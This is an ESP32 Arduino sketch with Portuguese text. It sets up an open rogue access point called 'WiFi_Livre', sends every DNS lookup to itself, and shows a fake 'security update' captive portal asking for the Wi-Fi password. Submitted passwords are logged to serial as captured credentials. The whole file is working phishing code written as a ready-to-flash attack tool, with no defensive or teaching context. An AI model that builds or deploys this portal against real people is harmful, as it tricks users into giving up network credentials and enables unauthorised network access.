#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

const char* ssid = "WiFi_Livre";
const byte DNS_PORT = 53;

DNSServer dnsServer;
WebServer server(80);

const char HTML_PORTAL[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Autenticacao de Rede</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; text-align: center; padding: 30px; }
        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
        h2 { color: #333; }
        input[type="password"] { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
        input[type="submit"] { background: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; width: 95%; }
        input[type="submit"]:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Atualizacao de Seguranca</h2>
        <p>Para prosseguir e navegar na internet, digite a senha da rede Wi-Fi:</p>
        <form action="/login" method="POST">
            <input type="password" name="wifipass" placeholder="Senha do Wi-Fi" required>
            <br>
            <input type="submit" value="Conectar">
        </form>
    </div>
</body>
</html>
)rawliteral";

void handleNotFound() {
    server.send(200, "text/html", HTML_PORTAL);
}

void handleLogin() {
    if (server.hasArg("wifipass")) {
        String input_pass = server.arg("wifipass");
        
        Serial.printf("\r\n[!] CREDENCIAL CAPTURADA: %s\r\n", input_pass.c_str());
        
        server.send(200, "text/html", "<h1>Autenticando... Aguarde 1 minuto.</h1>");
    } else {
        server.send(400, "text/plain", "Bad Request");
    }
}

void setup() {
    Serial.begin(115200);
    delay(1000);

    Serial.printf("\r\n--- [ESP32] Inicializando Rogue Access Point ---\r\n");

    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);

    IPAddress apIP = WiFi.softAPIP();
    Serial.printf("[+] AP Criado com Sucesso! SSID: %s\r\n", ssid);
    Serial.printf("[+] IP do Gateway: %s\r\n", apIP.toString().c_str());

    dnsServer.start(DNS_PORT, "*", apIP);

    server.on("/login", HTTP_POST, handleLogin);
    server.onNotFound(handleNotFound);
    server.begin();

    Serial.printf("[+] Servidor DNS Hijack e HTTP Ativos!\r\n");
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
}